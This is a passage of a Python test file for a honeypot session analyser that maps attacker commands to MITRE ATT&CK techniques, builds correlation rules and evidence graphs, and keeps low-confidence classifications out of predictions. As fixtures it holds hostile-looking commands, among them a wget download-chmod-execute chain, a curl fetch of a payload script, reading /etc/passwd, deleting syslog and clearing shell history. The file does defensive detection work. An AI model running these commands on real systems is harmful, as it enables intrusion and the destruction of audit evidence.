    assert "shell-startup-persistence-correlates-t1546" in modification_correlations
    assert "authorized-keys-modification-correlates-t1098" in modification_correlations
    assert all(item["apply_to_prediction"] is False for item in modification_correlations.values())


def test_session_correlation_attempt_wording_does_not_claim_success() -> None:
    policy = load_session_ttp_correlation_policy(Path("configs") / "session_ttp_correlation.trusted.json")
    rules = {item["rule_id"]: item for item in policy["policy"]["rules"]}
    assert "successful execution" in rules["download-then-execute-chain-correlates-t1059"]["reason"]
    assert "not confirmed" in rules["download-then-execute-chain-correlates-t1059"]["reason"]
    assert "successful privilege gain is not confirmed" in rules["privilege-escalation-attempt-correlates-t1548"]["reason"].lower()
    remote = rules["remote-service-attempt-correlates-t1021"]
    assert remote["ttp"] == "T1021.004"
    assert "propagation is not confirmed" in remote["reason"].lower()
    assert remote["apply_to_prediction"] is False


def test_session_evidence_graph_builds_ordered_sequences_without_secrets() -> None:
    payload = {
        "session_id": "graph-1",
        "src_ip": "8.8.8.8",
        "commands": ["whoami", "cat /etc/passwd"],
        "classification_events": [
            {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "confidence": 0.9, "source": "rule"},
            {"command": "cat /etc/passwd", "ttp": "T1003", "tactic": "credential-access", "confidence": 0.8, "source": "both"},
        ],
        "raw_events": [
            {"eventid": "cowrie.login.success", "username": "root", "password": "secret", "timestamp": "2026-05-24T00:00:00Z"},
            {"eventid": "cowrie.command.input", "input": "whoami", "timestamp": "2026-05-24T00:00:01Z"},
        ],
    }
    graph = build_session_evidence_graph(payload)
    assert graph["sequences"]["ttps"] == ["T1033", "T1003"]
    assert graph["sequences"]["tactics"] == ["discovery", "credential-access"]
    assert graph["summary"]["observable_count"] == 1
    raw_event_nodes = [node for node in graph["nodes"] if node.get("type") == "cowrie_event"]
    assert all("password" not in (node.get("fields") or {}) for node in raw_event_nodes)


def test_session_ttp_knowledge_pack_combines_with_policy_and_preserves_provenance() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        pack_path = Path(tmp) / "session_ttp_pack.json"
        pack = build_knowledge_pack(
            base_policy_path="configs/session_ttp_correlation.trusted.json",
            mitre_cache_path=str(Path(tmp) / "missing_mitre.json"),
            pack_id="unit-session-ttp-pack",
            version="unit",
            external_seed_model_path="",
        )
        pack_path.write_text(json.dumps(pack), encoding="utf-8")
        assert validate_session_ttp_correlation_policy(pack) == []

        combined = load_session_ttp_correlation_knowledge("", [str(pack_path)])
        summary = combined["knowledge_summary"]
        assert summary["knowledge_pack_ids"] == ["unit-session-ttp-pack"]
        assert summary["manual_rule_count"] >= 1
        assert summary["import_status"]["mitre_attack"]["status"] == "missing"

        updated = apply_session_ttp_correlations(
            {
                "session_id": "pack-corr-1",
                "src_ip": "8.8.8.8",
                "commands": ["wget http://x/payload.sh -O /tmp/a"],
                "classification_events": [
                    {"command": "wget http://x/payload.sh -O /tmp/a", "ttp": "T1105", "tactic": "command-and-control", "confidence": 1.0, "source": "rule"},
                ],
                "raw_events": [{"eventid": "cowrie.session.file_download", "timestamp": "2026-05-24T00:00:00Z"}],
            },
            combined,
        )
        summary = updated["session_ttp_correlation_summary"]
        assert summary["knowledge_pack_ids"] == ["unit-session-ttp-pack"]
        assert summary["rule_source_counts"]["human_curated_attck_detection"] >= 1
        assert updated["session_ttp_correlations"][0]["knowledge_pack_id"] == "unit-session-ttp-pack"

        combined_with_policy = load_session_ttp_correlation_knowledge(
            "configs/session_ttp_correlation.trusted.json",
            [str(pack_path)],
        )
        rule_ids = [
            rule.get("rule_id")
            for rule in (combined_with_policy.get("policy") or {}).get("rules") or []
        ]
        assert len(rule_ids) == len(set(rule_ids))
        assert combined_with_policy["knowledge_summary"]["rule_count"] == len(set(rule_ids))


def test_session_ttp_knowledge_pack_generates_sigma_candidate_rules() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        sigma_path = root / "sigma_cache.json"
        mitre_path = root / "mitre_cache.json"
        sigma_path.write_text(
            json.dumps(
                {
                    "rules": {
                        "sigma-unit-1": {
                            "title": "Suspicious History Cleanup",
                            "status": "test",
                            "level": "high",
                            "tags": ["attack.impact", "attack.t1565.001"],
                            "keywords": ["rm -f /var/log/syslog", "tamper_syslog", "sh"],
                            "logsource": {"product": "linux", "service": "auditd"},
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        mitre_path.write_text(
            json.dumps(
                {
                    "techniques": {
                        "T1565": {
                            "name": "Data Manipulation",
                            "tactics": ["Impact"],
                            "platforms": ["Linux", "Windows", "macOS"],
                        },
                        "T1565.001": {
                            "name": "Stored Data Manipulation",
                            "tactics": ["Impact"],
                            "platforms": ["Linux", "Windows", "macOS"],
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        pack = build_knowledge_pack(
            base_policy_path="",
            sigma_cache_path=str(sigma_path),
            mitre_cache_path=str(mitre_path),
            generate_sigma_rules=True,
            sigma_min_level="medium",
            max_sigma_rules=10,
            pack_id="sigma-generated-unit",
            version="unit",
        )
        assert validate_session_ttp_correlation_policy(pack) == []
        assert pack["import_status"]["sigma"]["status"] == "active_rules_generated"
        assert pack["summary"]["generated_rule_count"] == 1
        rule = pack["rules"][0]
        assert rule["source_type"] == "sigma_detection_correlation"
        assert rule["ttp"] == "T1565"
        assert rule["source_subtechnique"] == "T1565.001"
        assert rule["technique_granularity"] == "subtechnique_collapsed"
        assert rule["apply_to_prediction"] is False
        assert rule["provenance"]["generated"] is True

        updated = apply_session_ttp_correlations(
            {
                "session_id": "sigma-corr-1",
                "commands": ["rm -f /var/log/syslog"],
                "classification_events": [],
                "raw_events": [{"eventid": "cowrie.command.input", "input": "rm -f /var/log/syslog"}],
            },
            pack,
        )
        correlations = updated["session_ttp_correlations"]
        assert len(correlations) == 1
        assert correlations[0]["rule_id"] == "sigma-sigma-unit-1-t1565-001"
        assert correlations[0]["ttp"] == "T1565"
        assert correlations[0]["source_subtechnique"] == "T1565.001"
        assert correlations[0]["provenance"]["source_rule_id"] == "sigma-unit-1"


def test_session_ttp_knowledge_pack_generates_mitre_command_rules() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        mitre_path = root / "mitre_cache.json"
        mitre_path.write_text(
            json.dumps(
                {
                    "techniques": {
                        "T1105": {
                            "name": "Ingress Tool Transfer",
                            "tactics": ["Command And Control"],
                            "platforms": ["Linux", "Windows"],
                            "description": "On Linux adversaries may use `curl`, `wget`, or `scp` to transfer tools.",
                            "is_subtechnique": False,
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        pack = build_knowledge_pack(
            base_policy_path="",
            mitre_cache_path=str(mitre_path),
            generate_mitre_command_rules=True,
            max_mitre_command_rules=5,
            pack_id="mitre-generated-unit",
            version="unit",
        )
        assert validate_session_ttp_correlation_policy(pack) == []
        assert pack["import_status"]["mitre_attack"]["status"] == "active_rules_generated"
        rule = pack["rules"][0]
        assert rule["source_type"] == "mitre_attack_stix"
        assert rule["ttp"] == "T1105"
        assert rule["apply_to_prediction"] is False

        updated = apply_session_ttp_correlations(
            {
                "session_id": "mitre-corr-1",
                "commands": ["curl http://example.com/payload.sh"],
                "classification_events": [],
                "raw_events": [{"eventid": "cowrie.command.input", "input": "curl http://example.com/payload.sh"}],
            },
            pack,
        )
        correlations = updated["session_ttp_correlations"]
        assert len(correlations) == 1
        assert correlations[0]["ttp"] == "T1105"


def test_generated_session_ttp_pack_loads_as_external_candidate_coverage() -> None:
    pack_path = ROOT / "configs" / "session_ttp_knowledge_pack.generated.json"
    assert pack_path.exists()
    pack = json.loads(pack_path.read_text(encoding="utf-8"))
    assert validate_session_ttp_correlation_policy(pack) == []
    assert pack["review_status"] == "generated_unreviewed_no_prediction_influence"
    assert pack["summary"]["generated_rule_count"] > 0
    assert pack["summary"]["generated_prediction_rule_count"] == 0

    combined = load_session_ttp_correlation_knowledge(
        str(ROOT / "configs" / "session_ttp_correlation.trusted.json"),
        [str(pack_path)],
    )
    summary = combined["knowledge_summary"]
    assert summary["generated_rule_count"] == pack["summary"]["generated_rule_count"]
    assert summary["prediction_influence_rule_count"] == 0
    assert summary["generated_prediction_rule_count"] == 0
    assert "honeypot-session-ttp-generated-knowledge-pack" in summary["knowledge_pack_ids"]
    assert "sigma_detection_correlation" in summary["source_type_counts"]
    assert "mitre_attack_stix" in summary["source_type_counts"]


def test_unreviewed_generated_session_ttp_rule_cannot_influence_prediction() -> None:
    pack = json.loads((ROOT / "configs" / "session_ttp_knowledge_pack.generated.json").read_text(encoding="utf-8"))
    generated_rule = next(rule for rule in pack["rules"] if (rule.get("provenance") or {}).get("generated"))
    broken = {
        "schema_version": "session_ttp_knowledge_pack.v1",
        "pack_id": "broken-generated-prediction-pack",
        "version": "unit",
        "rules": [
            {
                **generated_rule,
                "apply_to_prediction": True,
                "provenance": {**generated_rule["provenance"], "reviewed": False},
            }
        ],
    }
    errors = validate_session_ttp_correlation_policy(broken)
    assert any("cannot be true for unreviewed generated rules" in error for error in errors)


def test_session_ttp_knowledge_pack_generates_external_seed_sequence_rules() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        mitre_path = root / "mitre_cache.json"
        seed_path = root / "external_seed.json"
        mitre_path.write_text(
            json.dumps(
                {
                    "techniques": {
                        "T1033": {
                            "name": "System Owner/User Discovery",
                            "tactics": ["Discovery"],
                            "platforms": ["Linux"],
                        },
                        "T1082": {
                            "name": "System Information Discovery",
                            "tactics": ["Discovery"],
                            "platforms": ["Linux"],
                        },
                    }
                }
            ),
            encoding="utf-8",
        )
        seed_path.write_text(
            json.dumps(
                {
                    "model_id": "external-unit",
                    "source_type": "external_cowrie_seed",
                    "usable_sessions": 100,
                    "technique_transitions": {"T1033": {"T1082": 50.0}},
                    "technique_tactics": {"T1082": {"discovery": 50.0}},
                }
            ),
            encoding="utf-8",
        )
        pack = build_knowledge_pack(
            base_policy_path="",
            mitre_cache_path=str(mitre_path),
            external_seed_model_path=str(seed_path),
            generate_external_seed_rules=True,
            external_seed_min_support=10,
            max_external_seed_rules=5,
            pack_id="external-seed-unit",
            version="unit",
        )
        assert validate_session_ttp_correlation_policy(pack) == []
        assert pack["import_status"]["external_seed_transition"]["status"] == "active_rules_generated"
        rule = pack["rules"][0]
        assert rule["source_type"] == "external_cowrie_seed"
        assert rule["ttp"] == "T1082"
        assert rule["temporal_claim"] is True
        assert rule["apply_to_prediction"] is False

        updated = apply_session_ttp_correlations(
            {
                "session_id": "external-seed-corr-1",
                "commands": ["whoami", "uname -a"],
                "classification_events": [
                    {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "confidence": 1.0},
                    {"command": "uname -a", "ttp": "T1082", "tactic": "discovery", "confidence": 1.0},
                ],
                "raw_events": [],
            },
            pack,
        )
        correlations = updated["session_ttp_correlations"]
        assert len(correlations) == 1
        assert correlations[0]["ttp"] == "T1082"
        assert correlations[0]["source_type"] == "external_cowrie_seed"


def test_session_ttp_knowledge_pack_generates_car_candidate_rules() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        mitre_path = root / "mitre_cache.json"
        car_path = root / "car_cache.json"
        mitre_path.write_text(
            json.dumps(
                {
                    "techniques": {
                        "T1070": {
                            "name": "Indicator Removal",
                            "tactics": ["Defense Evasion"],
                            "platforms": ["Linux"],
                        }
                    }
                }
            ),
            encoding="utf-8",
        )
        car_path.write_text(
            json.dumps(
                {
                    "analytics": [
                        {
                            "id": "CAR-UNIT-1",
                            "title": "Command history clear",
                            "techniques": ["T1070"],
                            "keywords": ["history -c"],
                        }
                    ]
                }
            ),
            encoding="utf-8",
        )
        pack = build_knowledge_pack(
            base_policy_path="",
            mitre_cache_path=str(mitre_path),
            car_cache_path=str(car_path),
            generate_car_rules=True,
            max_car_rules=5,
            pack_id="car-generated-unit",
            version="unit",
        )
        assert validate_session_ttp_correlation_policy(pack) == []
        assert pack["import_status"]["mitre_car"]["status"] == "active_rules_generated"
        rule = pack["rules"][0]
        assert rule["source_type"] == "mitre_car_analytic"
        assert rule["ttp"] == "T1070"

        updated = apply_session_ttp_correlations(
            {
                "session_id": "car-corr-1",
                "commands": ["history -c"],
                "classification_events": [],
                "raw_events": [{"eventid": "cowrie.command.input", "input": "history -c"}],
            },
            pack,
        )
        assert updated["session_ttp_correlations"][0]["source_type"] == "mitre_car_analytic"


def test_session_ttp_correlation_validation_rejects_missing_provenance() -> None:
    policy = {
        "schema_version": "session_ttp_correlation_policy.v1",
        "policy": {
            "enabled": True,
            "rules": [
                {
                    "rule_id": "bad-rule",
                    "ttp": "T1110",
                    "tactic": "credential-access",
                    "technique_name": "Brute Force",
                    "confidence": 0.8,
                    "evidence_type": "threshold_correlation",
                    "source_type": "operational_threshold",
                    "reason": "missing provenance should fail",
                    "conditions": {"any": [{"type": "min_login_failures", "count": 5}]},
                    "references": [{"name": "MITRE ATT&CK T1110", "url": "https://attack.mitre.org/techniques/T1110/"}],
                }
            ],
        },
    }
    errors = validate_session_ttp_correlation_policy(policy)
    assert any("provenance is required" in error for error in errors)


def test_session_worker_persists_session_ttp_correlations_in_features() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.enable_feed_loading = False
        cfg.enable_securebert = False
        cfg.enable_enrichment_jobs = False
        cfg.session_ttp_correlation_policy_path = "configs/session_ttp_correlation.trusted.json"
        cfg.prediction_policy = {
            "enabled": True,
            "min_active_scorers": 1,
            "weights": {"fallback_progression": 1.0},
        }
        storage = open_storage(cfg.database_url)
        storage.initialize()
        events = []
        for index, username in enumerate(["root", "root", "admin", "test", "oracle"], start=1):
            events.append(
                {
                    "eventid": "cowrie.login.failed",
                    "session": "corr-worker-1",
                    "src_ip": "203.0.113.50",
                    "sensor": "unit",
                    "timestamp": f"2026-05-24T00:00:0{index}Z",
                    "username": username,
                    "src_port": 40000 + index,
                }
            )
        events.extend(
            [
                {
                    "eventid": "cowrie.command.input",
                    "session": "corr-worker-1",
                    "src_ip": "203.0.113.50",
                    "sensor": "unit",
                    "timestamp": "2026-05-24T00:00:10Z",
                    "input": "wget http://x/payload.sh -O /tmp/a && chmod +x /tmp/a && /tmp/a",
                },
                {
                    "eventid": "cowrie.session.file_download",
                    "session": "corr-worker-1",
                    "src_ip": "203.0.113.50",
                    "sensor": "unit",
                    "timestamp": "2026-05-24T00:00:11Z",
                    "outfile": "var/lib/cowrie/downloads/hash",
                    "shasum": "abc",
                },
                {
                    "eventid": "cowrie.session.closed",
                    "session": "corr-worker-1",
                    "src_ip": "203.0.113.50",
                    "sensor": "unit",
                    "timestamp": "2026-05-24T00:00:12Z",
                    "duration": "10",
                },
            ]
        )
        for event in events:
            storage.store_event("unit", event)

        assert SessionWorker(cfg).process_unprocessed() == len(events)
        session_payload = json.loads(storage.list_rows("sessions", limit=10)[0]["payload_json"])
        rule_ids = {item["rule_id"] for item in session_payload["session_ttp_correlations"]}
        assert "ssh-login-failures-correlate-t1110" in rule_ids
        assert "cowrie-file-transfer-correlates-t1105" in rule_ids
        assert session_payload["session_evidence_graph_summary"]["command_count"] == 1

        snapshot_payload = json.loads(storage.list_rows("prediction_snapshots", limit=10)[0]["payload_json"])
        assert snapshot_payload["features"]["session_ttp_correlations"]
        assert snapshot_payload["features"]["session_evidence_graph_summary"]["command_count"] == 1
        assert snapshot_payload["features"]["correlated_tactics"] == []
        assert snapshot_payload["features"]["session_ttp_correlations"]


def test_legacy_alert_text_uses_injected_prediction_callback() -> None:
    from production.workers.session_monitor import SessionMonitor

    monitor = SessionMonitor(prediction_fn=lambda _state: ["unit-next-tactic"])
    state = monitor._get_or_create("alert-prediction", "203.0.113.20", "2026-05-12T00:00:00Z")
    state.ttps = ["T1033", "T1003", "T1105"]
    state.tactics = ["discovery", "credential-access", "command-and-control"]
    alerts = monitor._check_thresholds(state)
    assert alerts
    assert alerts[0].prediction == ["unit-next-tactic"]


def test_realtime_prediction_builds_features_and_ranked_snapshot() -> None:
    session_payload = {
        "session_id": "predict-1",
        "src_ip": "8.8.8.8",
        "sensor": "unit-test",
        "commands": ["whoami", "cat /etc/passwd"],
        "ttps": ["T1033", "T1003"],
        "tactics": ["discovery", "credential-access"],
        "classification_events": [
            {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "both", "confidence": 1.0},
            {"command": "cat /etc/passwd", "ttp": "T1003", "tactic": "credential-access", "source": "rule", "confidence": 1.0},
        ],
        "enrichment_status": {"status": "fresh", "providers": ["abuseipdb"]},
    }

    features = build_session_features(
        session_payload,
        current_event={"eventid": "cowrie.command.input", "timestamp": "2026-05-12T00:00:02Z"},
    )
    assert features["session_id"] == "predict-1"
    assert features["last_tactic"] == "credential-access"
    assert features["classification_source_counts"]["both"] == 1
    assert features["classification_chain_confidence_geomean"] == 1.0
    assert features["behavior_flags"]["has_credential_access"] is True

    snapshot = RealtimePredictionEngine().predict(features, event_id="evt-test")
    assert snapshot["schema_version"] == "prediction_snapshot.v1"
    assert snapshot["prediction"][0] == "persistence"
    assert snapshot["final_ranking"][0]["confidence"] in {"low", "medium", "high"}
    assert snapshot["active_weights"]["fallback_progression"] > snapshot["weights"]["fallback_progression"]
    assert snapshot["confidence_damping"]["factor"] == 1.0
    assert snapshot["final_ranking"][0]["sources"][0]["source_type"] == "heuristic_prior"
    assert snapshot["final_ranking"][0]["sources"][0]["damped_by_classification_confidence"] is True
    assert snapshot["classification_quality"]["source_counts"]["both"] == 1
    assert snapshot["classification_quality"]["confidence_geomean"] == 1.0
    assert snapshot["local_transition_model"]["source_type"] == "empirical_local"
    assert snapshot["calibration_status"]["status"] == "disabled"
    assert snapshot["trust_status"]["classification_validation_status"] == "unvalidated"
    assert "source_type" in snapshot["scorer_outputs"]["tactic_combination"][0]
    assert snapshot["scorer_outputs"]["fallback_progression"]
    fallback_contribution = snapshot["scorer_contributions"]["fallback_progression"]
    assert fallback_contribution["active"] is True
    assert fallback_contribution["active_weight"] > 0
    assert fallback_contribution["outputs"][0]["contribution"] > 0
    assert snapshot["risk_annotation"]["excluded_from_tactic_ranking"] is True


def test_session_features_use_trusted_classifications_for_sequences() -> None:
    features = build_session_features(
        {
            "session_id": "trusted-sequence",
            "commands": ["id", "ls /", "whoami"],
            "ttps": ["T1562", "T1033"],
            "tactics": ["defense-evasion", "discovery"],
            "classification_events": [
                {
                    "command": "id",
                    "source": "shell_noise",
                    "confidence": 0.0,
                    "tactic": "unknown",
                    "ttp": None,
                    "high_confidence": False,
                },
                {
                    "command": "ls /",
                    "source": "securebert_low_confidence",
                    "confidence": 0.1962,
                    "tactic": "defense-evasion",
                    "ttp": "T1562",
                    "high_confidence": False,
                },
                {
                    "command": "whoami",
                    "source": "rule",
                    "confidence": 1.0,
                    "tactic": "discovery",
                    "ttp": "T1033",
                    "high_confidence": True,
                },
            ],
        }
    )

    assert features["observed_ttps"] == ["T1033"]
    assert features["ttp_sequence"] == ["T1033"]
    assert features["observed_tactics"] == ["discovery"]
    assert features["tactic_sequence"] == ["discovery"]
    assert features["last_tactic"] == "discovery"
    assert features["classification_source_counts"] == {
        "shell_noise": 1,
        "securebert_low_confidence": 1,
        "rule": 1,
    }
    assert features["classification_chain_confidence_geomean"] == 1.0


def test_low_confidence_classification_is_audit_only_across_prediction_and_reporting() -> None:
    class Mitre:
        @staticmethod
        def get_tactics(_ttp):
            return ["defense-evasion"]

        @staticmethod
        def get_name(_ttp):
            return "Impair Defenses"

    classifier = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1562", 0.20),
        mitre_db=Mitre(),
        high_confidence=0.55,
    )
    from production.workers.session_monitor import SessionMonitor

    monitor = SessionMonitor(
        mitre_db=Mitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge", "bert_min_confidence": 0.55},
    )
    base = {
        "session": "low-confidence-audit",
        "src_ip": "203.0.113.9",
        "timestamp": "2026-07-12T00:00:00Z",
    }
    monitor.on_event({**base, "eventid": "cowrie.session.connect"})
    monitor.on_event({**base, "eventid": "cowrie.command.input", "input": "foobar /tmp/x"})
    state = monitor.get_session("low-confidence-audit")
    payload = session_to_payload(state)

    assert state.classification_events[0]["source"] == "securebert_low_confidence"
    assert state.classification_events[0]["ttp"] == "T1562"
    assert state.ttps == []
    assert state.tactics == []
    assert state.ttp_command_map == {}
    assert _build_trusted_reporting_views(state, Mitre()) == ({}, {})

    features = build_session_features(payload)
    assert features["ttp_sequence"] == []
    assert features["tactic_sequence"] == []
    assert features["classification_chain_confidence_geomean"] == 0.0
    snapshot = RealtimePredictionEngine().predict(features, event_id="weak-only")
    assert snapshot["classification_quality"]["audit_only_count"] == 1

    layers = build_threat_evidence_layers(payload)
    assert layers["direct_command_ttps"]["count"] == 0
    assert layers["audit_only_classification_candidates"]["count"] == 1
    assert layers["audit_only_classification_candidates"]["items"][0]["excluded_from_observed_facts"] is True

    graph = build_session_evidence_graph(payload)
    assert graph["sequences"]["ttps"] == []
    assert graph["sequences"]["tactics"] == []
    assert graph["flags"].get("has_defense_evasion_tactic") is not True
    assert graph["summary"]["audit_only_classification_event_count"] == 1
    assert graph["audit_only_classification_candidates"][0]["candidate_ttp"] == "T1562"
    assert graph["audit_only_classification_candidates"][0]["excluded_from_correlation"] is True
    assert not any(
        node.get("ttp") == "T1562"
        for node in graph["nodes"]
        if node.get("type") == "classification"
    )

    weak_only_policy = {
        "schema_version": "session_ttp_correlation_policy.v1",
        "policy_id": "weak-leakage-test",
        "version": "1",
        "policy": {
            "enabled": True,
            "rules": [
                {
                    "rule_id": "must-not-fire-from-weak-t1562",
                    "enabled": True,
                    "ttp": "T1562",
                    "tactic": "defense-evasion",
                    "technique_name": "Impair Defenses",
                    "confidence": 0.9,
                    "evidence_type": "sequence_correlation",
                    "source_type": "human_curated_attck_detection",
                    "temporal_claim": True,
                    "apply_to_prediction": False,
                    "reason": "Regression rule that must not consume weak classifications.",
                    "conditions": {
                        "any": [
                            {"type": "ordered_ttps", "sequence": ["T1562"]},
                            {"type": "evidence_flag", "flag": "has_defense_evasion_tactic"},
                        ]
                    },
                    "references": [{"name": "ATT&CK", "url": "https://attack.mitre.org/techniques/T1562/"}],
                    "provenance": {
                        "method": "unit_test",
                        "basis": ["weak-evidence trust boundary"],
                        "author": "test",
                        "reviewed": False,
                        "generated": False,
                        "created": "2026-07-12",
                        "version": "1",
                    },
                }
            ],
        },
    }
    correlated = apply_session_ttp_correlations(payload, weak_only_policy)
    assert correlated["session_ttp_correlations"] == []
    assert correlated["session_evidence_graph_summary"]["ttp_sequence"] == []
    assert correlated["session_evidence_graph_summary"]["tactic_sequence"] == []

    report = deterministic_baseline_report(payload, "unit fallback")
    assert report["ttps"] == []
    assert report["tactics"] == []
    assert report["threat_hypothesis"]["hypothesis_status"] == "insufficient_evidence"
    assert report["threat_hypothesis"]["analytical_evidence_strength"]["level"] == "Unscored"


def test_audit_only_classification_cannot_enter_secondary_consumers_or_model_training() -> None:
    trusted_discovery = {
        "command": "whoami",
        "source": "rule",
        "confidence": 1.0,
        "high_confidence": True,
        "ttp": "T1033",
        "tactic": "discovery",
    }
    weak_defense_evasion = {
        "command": "echo test",
        "source": "securebert_low_confidence",
        "confidence": 0.99,
        "high_confidence": False,
        "ttp": "T1562",
        "tactic": "defense-evasion",
    }
    trusted_execution = {
        "command": "sh /tmp/a",
        "source": "rule",
        "confidence": 1.0,
        "high_confidence": True,
        "ttp": "T1059",
        "tactic": "execution",
    }
    payload = {
        "session_id": "all-consumer-trust-boundary",
        "status": "closed",
        "is_ended": True,
        "commands": ["whoami", "echo test", "sh /tmp/a"],
        # Deliberately contaminated legacy aggregates must not override event trust.
        "ttps": ["T1033", "T1562", "T1059"],
        "tactics": ["discovery", "defense-evasion", "execution"],
        "classification_events": [trusted_discovery, weak_defense_evasion, trusted_execution],
        "raw_events": [],
        "session_ttp_correlations": [],
    }

    model = build_transition_model([payload])
    assert model["classification_event_count"] == 3
    assert model["trusted_classification_event_count"] == 2
    assert model["audit_only_classification_event_count"] == 1
    assert model["start_counts"] == {"discovery": 1.0}
    assert model["transitions"] == {"discovery": {"execution": 1.0}}
    assert "defense-evasion" not in json.dumps(model["transitions"])

    assert campaign_ordered_tactics(payload) == ["discovery", "execution"]
    assert threat_hunt_tactics(payload) == ["discovery", "execution"]
    smb_features = smb_decision_features(payload, {}, {}, {})
    assert smb_features["tactics"] == ["discovery", "execution"]
    assert smb_features["ttps"] == ["T1033", "T1059"]
    assert [step["tactic"] for step in backtest_tactic_steps(payload)] == [
        "discovery",
        "execution",
    ]

    weak_only_payload = {
        **payload,
        "classification_events": [weak_defense_evasion],
        "commands": ["echo test"],
    }
    weak_model = build_transition_model([weak_only_payload])
    assert weak_model["usable_sessions"] == 0
    assert weak_model["start_counts"] == {}
    assert campaign_ordered_tactics(weak_only_payload) == []
    assert threat_hunt_tactics(weak_only_payload) == []
    assert backtest_tactic_steps(weak_only_payload) == []
    assert build_auto_evidence_feedback(
        {
            "session_id": "all-consumer-trust-boundary",
            "snapshot_id": "snapshot-before-weak",
            "features": {"classification_events": []},
            "final_ranking": [{"tactic": "defense-evasion", "score": 0.9}],
        },
        weak_only_payload,
    ) is None


def test_shell_noise_is_retained_for_audit_but_not_observed_evidence() -> None:
    payload = {
        "session_id": "shell-noise-audit",
        "commands": ["exit"],
        "ttps": ["T1059"],
        "tactics": ["execution"],
        "classification_events": [
            {
                "command": "exit",
                "ttp": "T1059",
                "tactic": "execution",
                "source": "shell_noise",
                "confidence": 0.0,
                "high_confidence": False,
            }
        ],
    }
    features = build_session_features(payload)
    layers = build_threat_evidence_layers(payload)
    report = deterministic_baseline_report(payload, "unit fallback")

    assert features["ttp_sequence"] == []
    assert features["tactic_sequence"] == []
    assert layers["direct_command_ttps"]["count"] == 0
    assert layers["audit_only_classification_candidates"]["items"][0]["source"] == "shell_noise"
    assert report["ttps"] == []
    assert report["threat_hypothesis"]["hypothesis_status"] == "insufficient_evidence"


def test_session_correlation_is_report_only_without_review_and_evaluation() -> None:
    policy = {
        "schema_version": "session_ttp_correlation_policy.v1",
        "policy_id": "report-only-unit",
        "version": "1",
        "policy": {
            "enabled": True,
            "rules": [
                {
                    "rule_id": "candidate-discovery",
                    "enabled": True,
                    "ttp": "T1033",
                    "tactic": "discovery",
                    "technique_name": "System Owner/User Discovery",
                    "confidence": 0.9,
                    "evidence_type": "session_correlated_candidate",
                    "source_type": "human_curated_attck_detection",
                    "temporal_claim": False,
                    "apply_to_prediction": True,
                    "reason": "unit candidate",
                    "conditions": {"any": [{"type": "command_regex", "pattern": "whoami"}]},
                    "references": [{"name": "ATT&CK", "url": "https://attack.mitre.org/techniques/T1033/"}],
                    "provenance": {
                        "method": "manual_review",
                        "basis": ["unit"],
                        "author": "unit",
                        "reviewed": False,
                        "generated": False,
                        "created": "2026-07-12",
                        "version": "1",
                    },
                }
            ],
        },
    }
    updated = apply_session_ttp_correlations(
        {"session_id": "corr-report-only", "commands": ["whoami"], "classification_events": []},
        policy,
    )
    correlation = updated["session_ttp_correlations"][0]
    assert correlation["apply_to_prediction_requested"] is True
    assert correlation["apply_to_prediction"] is False
    assert correlation["prediction_eligibility"]["evaluated"] is False
    assert build_session_features(updated)["correlated_tactics"] == []

    eligible_rule = policy["policy"]["rules"][0]
    eligible_rule["provenance"]["reviewed"] = True
    eligible_rule["prediction_eligibility"] = {"reviewed": True, "evaluated": True}
    assert validate_session_ttp_correlation_policy(policy) == []
    eligible = apply_session_ttp_correlations(
        {"session_id": "corr-evaluated", "commands": ["whoami"], "classification_events": []},
        policy,
    )
    assert eligible["session_ttp_correlations"][0]["apply_to_prediction"] is True
    assert build_session_features(eligible)["correlated_tactics"] == ["discovery"]


def test_post_session_strength_and_follow_on_are_explicitly_non_probabilistic() -> None:
    class Bundle:
        ips = []
        urls = []

    strength = _build_analytical_confidence([], [], Bundle(), ai_enriched=False)
    assert strength["metric_name"] == "claim_evidence_summary"
    assert strength["calibrated_probability"] is False
    assert strength["deprecated"] is True
    assert "evidence_status" in strength["description"]
    assert _predict_next_action({}, Bundle(), {}) == (
        "Insufficient evidence to construct a falsifiable follow-on hypothesis."
    )
    assert _build_falsification_conditions({}, Bundle()) == []


def test_actor_profile_is_conservative_for_minimal_and_discovery_only_evidence() -> None:
    session = type(
        "Session",
        (),
        {
            "commands_success": ["ls /", "pwd"],
        },
    )()
    profile = _build_evidence_grounded_actor_profile(
        {"discovery": ["T1083"]},
        {"T1083": ["ls /", "pwd"]},
        [session],
        raw_events=[],
        behavioral_score=-1,
        score_reasons=["Extremely limited command set"],
    )

    assert profile["type"] == "Unknown"
    assert profile["sophistication"] == "Unassessed"
    assert profile["description"] == (
        "The observed behavior is insufficient to infer a reliable actor profile."
    )
    rendered = json.dumps(
        {
            key: value
            for key, value in profile.items()
            if not key.startswith("_")
        }
    ).lower()
    for unsupported_claim in (
        "organised actor",
        "organized actor",
        "targeted persistence",
        "credential stuffing",
        "payload dropping",
        "active implant",
        "infrastructure rotation",
    ):
        assert unsupported_claim not in rendered
    assert profile["supported_inferences"] == [
        "The trusted commands support host or environment discovery behavior."
    ]


def test_actor_profile_conservatism_matrix_covers_twenty_controlled_evidence_shapes() -> None:
    scenarios = [
        ({}, {}, []),
        ({"discovery": ["T1033"]}, {"T1033": ["whoami"]}, []),
        ({"discovery": ["T1082"]}, {"T1082": ["uname -a"]}, []),
        ({"discovery": ["T1083"]}, {"T1083": ["ls /tmp"]}, []),
        ({"discovery": ["T1057"]}, {"T1057": ["ps -ef"]}, []),
        ({"command-and-control": ["T1105"]}, {"T1105": ["curl http://x/a"]}, []),
        ({"command-and-control": ["T1105"]}, {"T1105": ["wget http://x/a"]}, [{"eventid": "cowrie.session.file_download"}]),
        ({"execution": ["T1059"]}, {"T1059": ["sh /tmp/a"]}, []),
